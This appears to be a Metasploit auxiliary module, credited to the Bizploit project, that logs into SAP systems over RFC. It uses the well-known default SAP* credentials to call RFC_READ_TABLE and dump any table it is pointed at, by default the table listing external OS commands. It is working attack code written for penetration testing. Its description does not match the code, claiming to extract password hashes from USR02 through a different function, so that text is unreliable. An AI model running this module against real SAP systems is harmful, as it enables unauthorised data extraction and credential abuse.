##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy.
# Id also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'msf/core/exploit/sap'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::SAP::RFC
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'SAP RFC RFC_READ_TABLE Data Extractor',
      'Description'    => %q{
        This module makes use of the RFC_ABAP_INSTALL_AND_RUN Remote Function Call to extract SAP user hashes from USR02.
        RFC_ABAP_INSTALL_AND_RUN takes ABAP source lines and executes them. It is common for the the function to be disabled or access revoked in a production system. It is also deprecated.
        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
      },
      'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
      'Author'         => [ 'nmonkee' ],
      'License'        => BSD_LICENSE
       )

    register_options(
      [
        Opt::RPORT(3342),
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992']),
        OptString.new('TABLE', [true, 'Table to Read', 'SXPGCOTABE']),
        OptString.new('FIELDS', [true, 'Fields to Read', 'NAME,OPCOMMAND,OPSYSTEM,PARAMETERS,ADDPAR']),
      ], self.class)
  end

  def run_host(rhost)
    unless datastore['CLIENT'] =~ /^\d{3}\z/
        fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
    end

    fields = datastore['FIELDS'].split(',')

    exec_READTBL(datastore['USERNAME'],
                datastore['CLIENT'],
                datastore['PASSWORD'],
                rhost,
                datastore['RPORT'],
                datastore['TABLE'],
                fields)
  end

  def exec_READTBL(user, client, pass, rhost, rport, table, fields)
    login(rhost, rport, client, user, pass) do |conn|
      conn.connection_info
      function = conn.get_function("RFC_READ_TABLE")

      fc = function.get_function_call

      fc[:DELIMITER] = '|'

      fc[:QUERY_TABLE] = table

      fields.each do |field|
        fc[:FIELDS].new_row do |row|
          row[:FIELDNAME] = field
        end
      end

      begin
        fc.invoke
        data_length = fc[:DATA].size
        data = ''
        for i in 0...data_length
          columns = (fc[:DATA][i][:WA]).split('|')
          columns.each { |c| c.strip! }
          data << columns.join(",") << "\n"
        end
        print data
      rescue NWError => e
        print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
      end
    end
  end
end

